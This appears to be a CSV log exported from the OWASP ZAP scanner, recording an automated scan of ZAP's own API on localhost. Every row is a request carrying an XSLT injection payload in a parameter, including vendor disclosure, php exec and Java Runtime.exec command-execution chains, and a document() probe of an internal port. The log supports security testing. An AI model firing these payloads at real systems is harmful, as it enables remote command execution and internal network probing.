ID,Request Tijdstempel,Response Tijdstempel,Methode,URL,Code,Reden,RTT,Grootte Resp. Header,Grootte Resp. Body
516703,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/stats/view/override?apikey=ZAP&keyPrefix=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,400,Bad Request,1,572,12
516704,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/stats/view/stats/override?apikey=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&keyPrefix=ZAP,200,OK,0,565,1076
516705,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/action/authenticateAsUser/override?apikey=%3C&contextId=ZAP&userId=ZAP,200,OK,0,565,1331
516706,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/stats/view/override?apikey=ZAP&keyPrefix=%3C&site=ZAP,400,Bad Request,2,572,12
516707,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/stats/view/siteStats/override?apikey=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E&keyPrefix=ZAP&site=ZAP,200,OK,0,565,1218
516708,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/action/authenticateAsUser/override?apikey=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&contextId=ZAP&userId=ZAP,200,OK,0,565,1331
516709,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/stats/view/stats/override?apikey=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&keyPrefix=ZAP,200,OK,1,565,1076
516710,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/stats/view/override?apikey=ZAP&keyPrefix=system-property%28%27xsl%3Avendor%27%29%2F%3E,400,Bad Request,1,572,12
516711,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/stats/view/stats/override?apikey=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Flocalhost%3A22%27%29%22%2F%3E&keyPrefix=ZAP,200,OK,0,565,1076
516712,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/action/authenticateAsUser/override?apikey=system-property%28%27xsl%3Avendor%27%29%2F%3E&contextId=ZAP&userId=ZAP,200,OK,0,565,1331
516713,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/stats/view/override?apikey=ZAP&keyPrefix=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&site=ZAP,400,Bad Request,0,572,12
516714,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/stats/view/siteStats/override?apikey=ZAP&keyPrefix=%3C&site=ZAP,200,OK,0,565,1218
516715,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/action/authenticateAsUser/override?apikey=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&contextId=ZAP&userId=ZAP,200,OK,0,565,1331
516716,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/stats/view/stats/override?apikey=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E&keyPrefix=ZAP,200,OK,0,565,1076
516717,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/stats/view/override?apikey=ZAP&keyPrefix=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,400,Bad Request,1,572,12
516718,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/stats/view/stats/override?apikey=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E&keyPrefix=ZAP,200,OK,1,565,1076
516719,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/stats/view/siteStats/override?apikey=ZAP&keyPrefix=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&site=ZAP,200,OK,1,565,1218
516720,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/action/authenticateAsUser/override?apikey=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&contextId=ZAP&userId=ZAP,200,OK,1,565,1331
516721,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/stats/view/override?apikey=ZAP&keyPrefix=system-property%28%27xsl%3Avendor%27%29%2F%3E&site=ZAP,400,Bad Request,1,572,12
516722,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/stats/view/stats/override?apikey=ZAP&keyPrefix=%3C,200,OK,1,565,1076
516723,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/stats/view/override?apikey=ZAP&keyPrefix=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&site=ZAP,400,Bad Request,1,572,12
516724,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/action/newUser/override?apikey=%3C&contextId=ZAP&name=ZAP,200,OK,1,565,1230
516725,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/action/authenticateAsUser/override?apikey=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Flocalhost%3A22%27%29%22%2F%3E&contextId=ZAP&userId=ZAP,200,OK,0,565,1330
516726,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/stats/view/siteStats/override?apikey=ZAP&keyPrefix=system-property%28%27xsl%3Avendor%27%29%2F%3E&site=ZAP,200,OK,1,565,1218
516727,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/action/override?apikey=%3C&authCredentialsConfigParams=ZAP&contextId=ZAP&userId=ZAP,400,Bad Request,0,572,13
516728,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/stats/view/stats/override?apikey=ZAP&keyPrefix=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,0,565,1075
516729,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/stats/view/siteStats/override?apikey=ZAP&keyPrefix=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&site=ZAP,200,OK,1,565,1218
516730,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/action/authenticateAsUser/override?apikey=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E&contextId=ZAP&userId=ZAP,200,OK,1,565,1331
516731,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/action/newUser/override?apikey=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&contextId=ZAP&name=ZAP,200,OK,0,565,1230
516732,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/action/override?apikey=%3C&contextId=ZAP&domain=ZAP&name=ZAP&path=ZAP&secure=ZAP&userId=ZAP&value=ZAP,400,Bad Request,1,572,13
516733,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/stats/view/stats/override?apikey=ZAP&keyPrefix=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,1,565,1076
516734,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/action/override?apikey=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&authCredentialsConfigParams=ZAP&contextId=ZAP&userId=ZAP,400,Bad Request,1,572,13
516735,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/action/override?apikey=%3C&contextId=ZAP&enabled=ZAP&userId=ZAP,400,Bad Request,1,572,13
516736,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/action/override?apikey=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&contextId=ZAP&domain=ZAP&name=ZAP&path=ZAP&secure=ZAP&userId=ZAP&value=ZAP,400,Bad Request,1,572,13
516737,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/stats/view/stats/override?apikey=ZAP&keyPrefix=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,0,565,1076
516738,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/action/override?apikey=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&contextId=ZAP&enabled=ZAP&userId=ZAP,400,Bad Request,1,572,13
516739,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/action/newUser/override?apikey=system-property%28%27xsl%3Avendor%27%29%2F%3E&contextId=ZAP&name=ZAP,200,OK,0,565,1230
516740,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/action/authenticateAsUser/override?apikey=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E&contextId=ZAP&userId=ZAP,200,OK,1,565,1331
516741,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/action/override?apikey=system-property%28%27xsl%3Avendor%27%29%2F%3E&contextId=ZAP&enabled=ZAP&userId=ZAP,400,Bad Request,1,572,13
516742,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/action/override?apikey=system-property%28%27xsl%3Avendor%27%29%2F%3E&authCredentialsConfigParams=ZAP&contextId=ZAP&userId=ZAP,400,Bad Request,1,572,13
516743,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/action/override?apikey=system-property%28%27xsl%3Avendor%27%29%2F%3E&contextId=ZAP&domain=ZAP&name=ZAP&path=ZAP&secure=ZAP&userId=ZAP&value=ZAP,400,Bad Request,1,572,13
516744,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/action/authenticateAsUser/override?apikey=ZAP&contextId=%3C&userId=ZAP,200,OK,0,565,1331
516745,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/action/override?apikey=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&contextId=ZAP&domain=ZAP&name=ZAP&path=ZAP&secure=ZAP&userId=ZAP&value=ZAP,400,Bad Request,1,572,13
516746,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/action/newUser/override?apikey=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&contextId=ZAP&name=ZAP,200,OK,1,565,1230
516747,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/action/authenticateAsUser/override?apikey=ZAP&contextId=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&userId=ZAP,200,OK,1,565,1331
516748,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/action/override?apikey=%3C&contextId=ZAP&lastPollResult=ZAP&lastPollTimeInMs=ZAP&requestsSinceLastPoll=ZAP&userId=ZAP,400,Bad Request,1,572,13
516749,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/action/override?apikey=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&authCredentialsConfigParams=ZAP&contextId=ZAP&userId=ZAP,400,Bad Request,0,572,13
516750,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/action/authenticateAsUser/override?apikey=ZAP&contextId=system-property%28%27xsl%3Avendor%27%29%2F%3E&userId=ZAP,200,OK,1,565,1331
516751,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/action/override?apikey=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&contextId=ZAP&enabled=ZAP&userId=ZAP,400,Bad Request,0,572,13
516752,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/action/override?apikey=%3C&contextId=ZAP&name=ZAP,400,Bad Request,1,572,13
516753,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/action/authenticateAsUser/override?apikey=ZAP&contextId=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&userId=ZAP,200,OK,1,565,1330
516754,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/action/newUser/override?apikey=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&contextId=ZAP&name=ZAP,200,OK,1,565,1229
516755,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/action/override?apikey=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&contextId=ZAP&domain=ZAP&name=ZAP&path=ZAP&secure=ZAP&userId=ZAP&value=ZAP,400,Bad Request,1,572,13
516756,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/action/newUser/override?apikey=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Flocalhost%3A22%27%29%22%2F%3E&contextId=ZAP&name=ZAP,200,OK,1,565,1228
516757,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/action/override?apikey=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&contextId=ZAP&name=ZAP,400,Bad Request,1,572,13
516758,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/action/override?apikey=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&contextId=ZAP&enabled=ZAP&userId=ZAP,400,Bad Request,1,572,13
516759,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/action/override?apikey=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&authCredentialsConfigParams=ZAP&contextId=ZAP&userId=ZAP,400,Bad Request,1,572,13
516760,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/action/override?apikey=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Flocalhost%3A22%27%29%22%2F%3E&contextId=ZAP&domain=ZAP&name=ZAP&path=ZAP&secure=ZAP&userId=ZAP&value=ZAP,400,Bad Request,1,572,13
516761,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/action/override?apikey=%3C&contextId=ZAP&name=ZAP&userId=ZAP,400,Bad Request,1,572,13
516762,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/action/override?apikey=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&contextId=ZAP&lastPollResult=ZAP&lastPollTimeInMs=ZAP&requestsSinceLastPoll=ZAP&userId=ZAP,400,Bad Request,1,572,13
516763,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/action/override?apikey=system-property%28%27xsl%3Avendor%27%29%2F%3E&contextId=ZAP&name=ZAP,400,Bad Request,1,572,13
516764,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/action/override?apikey=%3C&contextId=ZAP&userId=ZAP,400,Bad Request,1,572,13
516765,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/action/newUser/override?apikey=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E&contextId=ZAP&name=ZAP,200,OK,1,565,1230
516766,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/action/override?apikey=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Flocalhost%3A22%27%29%22%2F%3E&authCredentialsConfigParams=ZAP&contextId=ZAP&userId=ZAP,400,Bad Request,7,572,13
516767,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/action/override?apikey=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E&contextId=ZAP&domain=ZAP&name=ZAP&path=ZAP&secure=ZAP&userId=ZAP&value=ZAP,400,Bad Request,7,572,13
516768,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/action/override?apikey=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&contextId=ZAP&name=ZAP,400,Bad Request,1,572,13
516769,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/action/newUser/override?apikey=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E&contextId=ZAP&name=ZAP,200,OK,1,565,1230
516770,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/action/override?apikey=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E&contextId=ZAP&domain=ZAP&name=ZAP&path=ZAP&secure=ZAP&userId=ZAP&value=ZAP,400,Bad Request,1,572,13
516771,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/action/override?apikey=system-property%28%27xsl%3Avendor%27%29%2F%3E&contextId=ZAP&lastPollResult=ZAP&lastPollTimeInMs=ZAP&requestsSinceLastPoll=ZAP&userId=ZAP,400,Bad Request,1,572,13
516772,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/action/override?apikey=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&contextId=ZAP&name=ZAP&userId=ZAP,400,Bad Request,7,572,13
516773,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/action/override?apikey=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Flocalhost%3A22%27%29%22%2F%3E&contextId=ZAP&enabled=ZAP&userId=ZAP,400,Bad Request,8,572,13
516774,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/action/newUser/override?apikey=ZAP&contextId=%3C&name=ZAP,200,OK,1,565,1230
516775,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/action/override?apikey=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&contextId=ZAP&name=ZAP,400,Bad Request,1,572,13
516776,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/action/override?apikey=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E&contextId=ZAP&enabled=ZAP&userId=ZAP,400,Bad Request,1,572,13
516777,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/action/override?apikey=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E&authCredentialsConfigParams=ZAP&contextId=ZAP&userId=ZAP,400,Bad Request,1,572,13
516778,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/action/override?apikey=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&contextId=ZAP&userId=ZAP,400,Bad Request,1,572,13
516779,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/action/newUser/override?apikey=ZAP&contextId=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&name=ZAP,200,OK,0,565,1230
516780,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/action/override?apikey=system-property%28%27xsl%3Avendor%27%29%2F%3E&contextId=ZAP&name=ZAP&userId=ZAP,400,Bad Request,1,572,13
516781,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/action/override?apikey=ZAP&contextId=%3C&domain=ZAP&name=ZAP&path=ZAP&secure=ZAP&userId=ZAP&value=ZAP,400,Bad Request,2,572,13
516782,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/action/override?apikey=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&contextId=ZAP&lastPollResult=ZAP&lastPollTimeInMs=ZAP&requestsSinceLastPoll=ZAP&userId=ZAP,400,Bad Request,1,572,13
516783,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/action/override?apikey=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&contextId=ZAP&name=ZAP&userId=ZAP,400,Bad Request,1,572,13
516784,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/action/pollAsUser/override?apikey=%3C&contextId=ZAP&userId=ZAP,200,OK,1,565,1377
516785,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/action/override?apikey=ZAP&contextId=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&domain=ZAP&name=ZAP&path=ZAP&secure=ZAP&userId=ZAP&value=ZAP,400,Bad Request,1,572,13
516786,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/action/override?apikey=system-property%28%27xsl%3Avendor%27%29%2F%3E&contextId=ZAP&userId=ZAP,400,Bad Request,0,572,13
